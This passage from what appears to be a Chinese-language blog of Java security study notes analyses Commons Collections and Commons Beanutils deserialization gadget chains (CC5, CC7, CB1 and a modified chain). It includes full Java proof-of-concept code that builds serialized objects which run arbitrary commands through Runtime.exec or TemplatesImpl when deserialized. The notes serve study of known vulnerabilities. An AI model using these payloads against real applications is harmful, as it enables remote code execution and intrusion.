<p>This only works in <strong>JDK 8u76</strong> and <strong>WITHOUT a security manager</strong></p>
</blockquote>
<p>  <code>commons-collections:3.1</code></p>
</li>
<li><p>poc 触发器分析</p>
<p>  刚开始看到这个安全管理器的限制可能会感到奇怪</p>
<p>  首先我们还是利用到了 <code>TiedMapEntry</code> ，但这次触发到 getValue gadget 不是通过 hashCode 而是通过 toString</p>
<p class='item-img' data-src='/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2018.png'><img src="/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2018.png" alt="Untitled"></p>
<ul>
<li><p>反序列化入口：<code>BadAttributeValueExpException</code></p>
<p>  分析 readObject 方法，首先会获取序列化流中的 val 字段，并拿到具体对象（Object 类无限制），当 <code>System.*getSecurityManager*() == null</code> 时即可调用到该对象的 toString 方法，这就可以和上文接上</p>
<p class='item-img' data-src='/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2019.png'><img src="/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2019.png" alt="Untitled"></p>
</li>
<li><p>Java Poc</p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> BadAttributeValueExpException <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String command)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>		<span class="hljs-keyword">final</span> String[] execArgs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; command &#125;;<br>		<span class="hljs-comment">// inert chain for setup</span><br>		<span class="hljs-keyword">final</span> <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<br>		        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123; <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>) &#125;);<br>		<span class="hljs-comment">// real chain for after setup</span><br>		<span class="hljs-keyword">final</span> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>				<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>				<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>					String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>					<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>				<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>					Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>					<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>				<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<br>					<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;, execArgs),<br>				<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>) &#125;;<br><br>		<span class="hljs-keyword">final</span> <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>		<span class="hljs-keyword">final</span> <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);<br><br>		<span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;foo&quot;</span>);<br><br>		<span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>		<span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        Reflections.setAccessible(valfield);<br>		valfield.set(val, entry);<br><br>		Reflections.setFieldValue(transformerChain, <span class="hljs-string">&quot;iTransformers&quot;</span>, transformers); <span class="hljs-comment">// arm with actual transformer chain</span><br><br>		<span class="hljs-keyword">return</span> val;<br>	&#125;<br></code></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<pre><code>gadget chain:

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream.readObject()<br>            BadAttributeValueExpException.readObject()<br>                TiedMapEntry.toString()<br>                    LazyMap.get()<br>                        ChainedTransformer.transform()<br>                            ConstantTransformer.transform()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Class.getMethod()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Runtime.getRuntime()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Runtime.exec()<br></code></pre></td></tr></table></figure>
</code></pre><h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><hr>
<ul>
<li><p>版本限制</p>
<p>  <code>commons-collections:3.1</code></p>
</li>
<li><p>触发器</p>
<p>  HashTable:</p>
<p>  <code>readObejct</code> → <code>reconstitutionPut</code> </p>
<p>  先来分析一下 HashTable 的 put 操作（<strong>readObject 过程发生一样的过程</strong>），首先会根据 key 类型计算 hash，再利用 <code>(hash &amp; 0x7FFFFFFF) % tab.length</code> 得到一个哈希表的索引，当该索引对应的条目为 null 时，证明未发生哈希冲突，当前条目可以存放元素，于是创建一个条目并存储相应值。</p>
<p>  由此我们可以知道，如果想进入 for 循环，则需要满足第二次 put 时元素计算 hash 得到的 index 与上一次相同才可以，即构造出来一个哈希冲突</p>
<p>  当前面的条件满足时（后面分析如何满足）会触发 <code>e.key.equals(key)</code>，前后的 key 分别时 hashtable 构造放入的两个 lazymap</p>
<p class='item-img' data-src='/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2020.png'><img src="/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2020.png" alt="Untitled"></p>
<p>  之后也就是调用 lazymap 的 equals 方法，由于 HashMap 没有所有会向父类 <code>java.util.AbstractMap</code> 中寻找</p>
<p class='item-img' data-src='/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2021.png'><img src="/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2021.png" alt="Untitled"></p>
<p class='item-img' data-src='/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2022.png'><img src="/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2022.png" alt="Untitled"></p>
<p>  说明一下这里参数，上图当中 entry 指代 <code>lazyMap1</code>, 调用的参数指代 <code>lazyMap2</code>（即当前方法的对象 o 和 赋值后的 m）</p>
<p class='item-img' data-src='/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2023.png'><img src="/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2023.png" alt="Untitled"></p>
<p>  紧接着就会触发 lazymap 的 get 利用链 RCE</p>
<p>  <strong>这里需要再次强调：</strong>lazymap get 时只有不含指定 key 时才会继续调用 gadget，并且调用一遍之后就会 put 进去，如果想要再次调用的话则需要手动将 key remove 掉（或者直接全部 clear/remove)，这里即需要移出 yy</p>
<p class='item-img' data-src='/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2024.png'><img src="/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2024.png" alt="Untitled"></p>
<ul>
<li><p>如何构造 hash 碰撞？</p>
<p>  回到 HashTable，index 的计算如下：</p>
<p>  <code>(String.hash &amp; 0x7FFFFFFF) % tab.length</code> 也就是让 String 计算的 hash 相同即可，</p>
<p class='item-img' data-src='/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2025.png'><img src="/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2025.png" alt="Untitled"></p>
<p>  value 为实际存储的字符串 char[]， hash 为成员变量</p>
<p>  对于 yy 和 zZ，第一个字符计算后相差1，那么第二轮次算后，需要前面比后面大31</p>
<p class='item-img' data-src='/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2026.png'><img src="/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2026.png" alt="Untitled"></p>
</li>
</ul>
</li>
<li><p>POC</p>
<ul>
<li><p>Java Poc</p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Hashtable <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String command)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">// Reusing transformer chain and LazyMap gadgets from previous payloads</span><br>        <span class="hljs-keyword">final</span> String[] execArgs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;command&#125;;<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;&#125;);<br><br>        <span class="hljs-keyword">final</span> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                execArgs),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>        <span class="hljs-comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap1</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap1, transformerChain);<br>        lazyMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap2, transformerChain);<br>        lazyMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);<br><br>        <span class="hljs-comment">// Use the colliding Maps as keys in Hashtable</span><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(lazyMap1, <span class="hljs-number">1</span>);<br>        hashtable.put(lazyMap2, <span class="hljs-number">2</span>);<br><br>        Reflections.setFieldValue(transformerChain, <span class="hljs-string">&quot;iTransformers&quot;</span>, transformers);<br><br>        <span class="hljs-comment">// Needed to ensure hash collision after previous manipulations</span><br>        lazyMap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> hashtable;<br>    &#125;<br></code></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h2 id="CB1"><a href="#CB1" class="headerlink" title="CB1"></a>CB1</h2><hr>
<ul>
<li>限制</li>
<li><p>触发器 BeanComparator</p>
<p>  衔接之前优先级队列当中会调用比较器的 compare 方法，<code>BeanComparator#compare()</code> 中若 property 字段非 null 的话，则会调用 CB 特有的 <code>PropertyUtils.*getProperty</code>* 递归获取指定属性的 getter 方法并调用</p>
<p class='item-img' data-src='/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2027.png'><img src="/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2027.png" alt="Untitled"></p>
<p>  结合 TemplatesImpl gaget 的调用链，我们可以利用到 <code>org.apache.xalan.xsltc.trax.TemplatesImpl#getOutputProperties</code> </p>
<p class='item-img' data-src='/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2028.png'><img src="/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2028.png" alt="Untitled"></p>
</li>
<li><p>POC</p>
<ul>
<li><p>Java Poc</p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String command)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>		<span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> Gadgets.createTemplatesImpl(command);<br>		<span class="hljs-comment">// mock method name until armed</span><br>		<span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;lowestSetBit&quot;</span>);<br><br>		<span class="hljs-comment">// create queue with numbers and basic comparator</span><br>		<span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, comparator);<br>		<span class="hljs-comment">// stub data for replacement later</span><br>		queue.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span class="hljs-string">&quot;1&quot;</span>));<br>		queue.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span class="hljs-string">&quot;1&quot;</span>));<br><br>		<span class="hljs-comment">// switch method called by comparator</span><br>		Reflections.setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>		<span class="hljs-comment">// switch contents of queue</span><br>		<span class="hljs-keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>);<br>		queueArray[<span class="hljs-number">0</span>] = templates;<br>		queueArray[<span class="hljs-number">1</span>] = templates;<br><br>		<span class="hljs-keyword">return</span> queue;<br>	&#125;<br></code></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h2 id="C11-——-魔改-yso"><a href="#C11-——-魔改-yso" class="headerlink" title="C11 —— 魔改 yso"></a>C11 —— 魔改 yso</h2><hr>
<ul>
<li><p>版本限制：无 jdk 版本限制</p>
<p>  <code>CommonsCollections 3.1-3.2.1</code></p>
</li>
<li><p>POC 编写</p>
<ul>
<li><p>Java Poc</p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Serializable <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String command)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> Gadgets.createTemplatesImpl(command);<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;toString&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, templatesImpl);<br><br>        <span class="hljs-type">HashSet</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>(<span class="hljs-number">1</span>);<br>        map.add(<span class="hljs-string">&quot;foo&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            f = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            f = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;backingMap&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">// 先拿到内部的 HashMap 成员 instance</span><br>        Reflections.setAccessible(f);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">innimpl</span> <span class="hljs-operator">=</span> (HashMap) f.get(map);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f2</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            f2 = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            f2 = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;elementData&quot;</span>);<br>        &#125;<br><br>        Reflections.setAccessible(f2);<br>        Object[] array = (Object[]) f2.get(innimpl);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> array[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span>(node == <span class="hljs-literal">null</span>)&#123;<br>            node = array[<span class="hljs-number">1</span>];<br>        &#125;<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">keyField</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span>&#123;<br>            keyField = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            keyField = Class.forName(<span class="hljs-string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        &#125;<br><br>        Reflections.setAccessible(keyField);<br>        keyField.set(node, entry);<br><br>        Reflections.setFieldValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br></code></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<pre><code>确实就是 CC1-7 的组合，这里是 CC6 类加载的方式拼接起来就行，后面 InvokerTransformer 利用 `newTransformer` 来调用后续 RCE 即可
</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><hr>
<p>[1] <a target="_blank" rel="noopener" href="https://h0cksr.xyz/archives/484">https://h0cksr.xyz/archives/484</a></p>
<p>[2] <a target="_blank" rel="noopener" href="https://amiaaaz.github.io/2022/03/23/java-study-notes-03/">https://amiaaaz.github.io/2022/03/23/java-study-notes-03/</a></p>
